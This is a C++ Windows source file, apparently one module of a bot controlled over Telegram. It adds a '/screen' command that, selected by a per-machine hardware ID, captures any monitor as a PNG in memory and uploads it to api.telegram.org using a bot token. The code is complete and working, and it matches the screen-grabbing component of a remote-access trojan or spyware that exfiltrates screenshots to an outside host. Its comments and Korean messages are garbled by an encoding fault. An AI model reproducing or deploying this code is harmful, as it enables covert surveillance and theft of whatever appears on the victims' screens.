#include "Commands.h"
#include "TelegramApi.h"
#include "Config.h"

#include <windows.h>
#include <winhttp.h>   // WinHTTP ����
#include <gdiplus.h>   // GDI+ PNG ���ڵ�
#include <objidl.h>
#include <memory>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")

using namespace Gdiplus;

// ===== DPI �ν� ��ȭ (���� �ε�, �� ����) =====
#ifndef DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2
#define DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 ((HANDLE)-4)
#endif
static void EnsurePerMonitorDpiAware() {
    static bool done = false;
    if (done) return;

    // 1) user32!SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)
    HMODULE hUser = GetModuleHandleW(L"user32.dll");
    if (hUser) {
        typedef BOOL(WINAPI* PFN_SetPDAContext)(HANDLE);
        auto p = (PFN_SetPDAContext)GetProcAddress(hUser, "SetProcessDpiAwarenessContext");
        if (p && p(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2)) { done = true; return; }
    }

    // 2) shcore!SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE=2)
    HMODULE hShcore = LoadLibraryW(L"shcore.dll");
    if (hShcore) {
        typedef HRESULT(WINAPI* PFN_SetPDA)(int);
        auto p = (PFN_SetPDA)GetProcAddress(hShcore, "SetProcessDpiAwareness");
        if (p) {
            if (p(2 /*PROCESS_PER_MONITOR_DPI_AWARE*/) == 0) { done = true; FreeLibrary(hShcore); return; }
        }
        FreeLibrary(hShcore);
    }

    // 3) user32!SetProcessDPIAware()
    if (hUser) {
        typedef BOOL(WINAPI* PFN_SetDPIAware)(void);
        auto p = (PFN_SetDPIAware)GetProcAddress(hUser, "SetProcessDPIAware");
        if (p) p();
    }
    done = true;
}

// ===== ����� ���� =====
struct MonInfo {
    HMONITOR hmon{};
    RECT rc{};                // ����� ��ǥ(�»�� ����)
    WCHAR devName[32]{};      // "\\.\DISPLAY1"
};
static BOOL CALLBACK EnumMonProc(HMONITOR hMon, HDC, LPRECT, LPARAM lp) {
    auto vec = reinterpret_cast<std::vector<MonInfo>*>(lp);
    MONITORINFOEXW mi{}; mi.cbSize = sizeof(mi);
    if (GetMonitorInfoW(hMon, &mi)) {
        MonInfo m; m.hmon = hMon; m.rc = mi.rcMonitor;
        lstrcpynW(m.devName, mi.szDevice, _countof(m.devName));
        vec->push_back(m);
    }
    return TRUE;
}

// ===== ���� ��ư ���� =====
static bool SendTextWithButtons_Multi(long long chatId,
    const std::wstring& textW,
    const std::vector<std::string>& labels,
    const std::vector<std::string>& callbacks,
    int columns = 3) {
    std::string markup = "{\"inline_keyboard\":[";
    const int n = (int)labels.size();
    for (int i = 0; i < n; ) {
        if (i) markup += ",";
        markup += "[";
        for (int c = 0; c < columns && i < n; ++c, ++i) {
            if (c) markup += ",";
            markup += "{\"text\":\"" + JsonEscape(labels[i]) +
                "\",\"callback_data\":\"" + JsonEscape(callbacks[i]) + "\"}";
        }
        markup += "]";
    }
    markup += "]}";

    std::string body = "chat_id=" + std::to_string(chatId) +
        "&text=" + UrlEncode(WToUtf8(textW)) +
        "&reply_markup=" + UrlEncode(markup);
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendMessage";
    std::string resp; bool ok = HttpPostForm(path, body, resp);
    return ok && resp.find("\"ok\":true") != std::string::npos;
}

// ===== GDI+ RAII & PNG ���ڴ� =====
struct GdiplusGuard {
    ULONG_PTR token{};
    GdiplusGuard() { GdiplusStartupInput in; GdiplusStartup(&token, &in, nullptr); }
    ~GdiplusGuard() { if (token) GdiplusShutdown(token); }
};
static int GetEncoderClsid(const WCHAR* mime, CLSID* p) {
    UINT num = 0, size = 0; GetImageEncodersSize(&num, &size); if (!size) return -1;
    std::vector<BYTE> buf(size);
    ImageCodecInfo* info = reinterpret_cast<ImageCodecInfo*>(buf.data());
    if (GetImageEncoders(num, size, info) != Ok) return -1;
    for (UINT i = 0; i < num; ++i) if (wcscmp(info[i].MimeType, mime) == 0) { *p = info[i].Clsid; return (int)i; }
    return -1;
}

// ===== ����� ĸó �� PNG ����Ʈ (�޸�) =====
// index: 1-based
static bool CaptureMonitorPngBytes(int index, std::vector<unsigned char>& outPng) {
    EnsurePerMonitorDpiAware();

    std::vector<MonInfo> mons;
    EnumDisplayMonitors(nullptr, nullptr, EnumMonProc, (LPARAM)&mons);
    if (index < 1 || index >(int)mons.size()) return false;
    RECT rc = mons[index - 1].rc;

    HDC hScr = GetDC(nullptr); if (!hScr) return false;
    const int w = rc.right - rc.left;
    const int h = rc.bottom - rc.top;

    HDC hMem = CreateCompatibleDC(hScr);
    if (!hMem) { ReleaseDC(nullptr, hScr); return false; }

    HBITMAP hbmp = CreateCompatibleBitmap(hScr, w, h);
    if (!hbmp) { DeleteDC(hMem); ReleaseDC(nullptr, hScr); return false; }

    HGDIOBJ old = SelectObject(hMem, hbmp);
    BitBlt(hMem, 0, 0, w, h, hScr, rc.left, rc.top, SRCCOPY | CAPTUREBLT);
    SelectObject(hMem, old);

    // GDI+ PNG ���ڵ� �� IStream
    GdiplusGuard gdip;
    std::unique_ptr<Bitmap> bmp(Bitmap::FromHBITMAP(hbmp, nullptr));
    DeleteObject(hbmp);
    DeleteDC(hMem);
    ReleaseDC(nullptr, hScr);
    if (!bmp || bmp->GetLastStatus() != Ok) return false;

    IStream* pStream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(nullptr, TRUE, &pStream))) return false;
    CLSID clsid{};
    if (GetEncoderClsid(L"image/png", &clsid) < 0) { pStream->Release(); return false; }
    if (bmp->Save(pStream, &clsid, nullptr) != Ok) { pStream->Release(); return false; }

    HGLOBAL hGlob = nullptr;
    if (FAILED(GetHGlobalFromStream(pStream, &hGlob))) { pStream->Release(); return false; }
    SIZE_T sz = GlobalSize(hGlob);
    void* p = GlobalLock(hGlob);
    if (!p || sz == 0) { if (p) GlobalUnlock(hGlob); pStream->Release(); return false; }
    outPng.assign((unsigned char*)p, (unsigned char*)p + sz);
    GlobalUnlock(hGlob);
    pStream->Release();
    return true;
}

// ===== multipart/form-data �� sendPhoto =====
static bool SendPhotoFromBytes(long long chatId, const std::vector<unsigned char>& png) {
    const std::string boundary = "----CppBotBoundary7d93b6c2c8bf4e7e";
    const std::string sep = "--" + boundary + "\r\n";
    const std::string end = "--" + boundary + "--\r\n";

    std::string head1 = sep +
        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
        std::to_string(chatId) + "\r\n" +
        sep +
        "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.png\"\r\n"
        "Content-Type: image/png\r\n\r\n";
    std::string tail = "\r\n" + end;

    std::vector<char> body;
    body.reserve(head1.size() + png.size() + tail.size());
    body.insert(body.end(), head1.begin(), head1.end());
    body.insert(body.end(), (const char*)png.data(), (const char*)png.data() + png.size());
    body.insert(body.end(), tail.begin(), tail.end());

    // WinHTTP ����
    HINTERNET S = WinHttpOpen(L"CppBot/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!S) return false;
    HINTERNET C = WinHttpConnect(S, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!C) { WinHttpCloseHandle(S); return false; }
    std::wstring path = L"/bot" + BOT_TOKEN + L"/sendPhoto";
    HINTERNET R = WinHttpOpenRequest(C, L"POST", path.c_str(), nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!R) { WinHttpCloseHandle(C); WinHttpCloseHandle(S); return false; }

    std::wstring hdr = L"Content-Type: multipart/form-data; boundary=" +
        std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
    BOOL ok = WinHttpSendRequest(R, hdr.c_str(), (DWORD)-1,
        (LPVOID)body.data(), (DWORD)body.size(),
        (DWORD)body.size(), 0);
    if (ok) ok = WinHttpReceiveResponse(R, nullptr);

    bool ret = false;
    if (ok) {
        std::string resp;
        DWORD rd = 0;
        do {
            DWORD sz = 0;
            if (!WinHttpQueryDataAvailable(R, &sz) || sz == 0) break;
            std::vector<char> buf(sz + 1, 0);
            if (!WinHttpReadData(R, buf.data(), sz, &rd)) break;
            resp.append(buf.data(), rd);
        } while (rd > 0);
        ret = resp.find("\"ok\":true") != std::string::npos;
    }
    WinHttpCloseHandle(R); WinHttpCloseHandle(C); WinHttpCloseHandle(S);
    return ret;
}

// ===== /screen �ڵ鷯 =====
static bool ScreenHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
    EnsurePerMonitorDpiAware();

    // ����� ����
    std::vector<MonInfo> mons;
    EnumDisplayMonitors(nullptr, nullptr, EnumMonProc, (LPARAM)&mons);

    // ���� ����
    auto trim = [](const std::string& s) {
        size_t a = s.find_first_not_of(" \t\r\n");
        size_t b = s.find_last_not_of(" \t\r\n");
        if (a == std::string::npos) return std::string();
        return s.substr(a, b - a + 1);
        };
    std::string arg = trim(argsUtf8);

    if (arg.empty()) {
        if (mons.empty()) return SendText(chatId, WToUtf8(L"����͸� ã�� �� �����ϴ�."));

        // ���� �ȼ� �ػ�(dmPelsWidth/Height)�� ǥ��
        std::wstring text = L"����� ��� (���� �ػ�)\n";
        for (size_t i = 0; i < mons.size(); ++i) {
            DEVMODEW dm{}; dm.dmSize = sizeof(dm);
            int w = mons[i].rc.right - mons[i].rc.left;
            int h = mons[i].rc.bottom - mons[i].rc.top;
            if (EnumDisplaySettingsExW(mons[i].devName, ENUM_CURRENT_SETTINGS, &dm, 0)) {
                if (dm.dmPelsWidth && dm.dmPelsHeight) { w = (int)dm.dmPelsWidth; h = (int)dm.dmPelsHeight; }
            }
            text += L"[" + std::to_wstring((int)i + 1) + L"] " + std::to_wstring(w) + L"x" + std::to_wstring(h) + L"\n";
        }

        std::vector<std::string> labels, callbacks;
        labels.reserve(mons.size()); callbacks.reserve(mons.size());
        for (size_t i = 0; i < mons.size(); ++i) {
            std::string idx = std::to_string((int)i + 1);
            labels.push_back(idx);
            callbacks.push_back("/" + hwid8 + " screen " + idx);
        }
        return SendTextWithButtons_Multi(chatId, text, labels, callbacks, 3);
    }

    // ���� �Ľ�
    int idx = 0;
    try { idx = std::stoi(arg); }
    catch (...) { idx = 0; }
    if (idx < 1 || idx >(int)mons.size()) {
        return SendText(chatId, WToUtf8(L"�� �� ���� ����"));
    }

    // ĸó �� PNG �޸� �� ����
    std::vector<unsigned char> png;
    if (!CaptureMonitorPngBytes(idx, png)) {
        return SendText(chatId, WToUtf8(L"ĸó ����"));
    }
    return SendPhotoFromBytes(chatId, png);
}

// �ڵ� ���(���� ����ó�� �ڿ� ����)
struct ScreenRegistrar {
    ScreenRegistrar() { RegisterCommand("screen", &ScreenHandler); }
} g_screen_registrar;
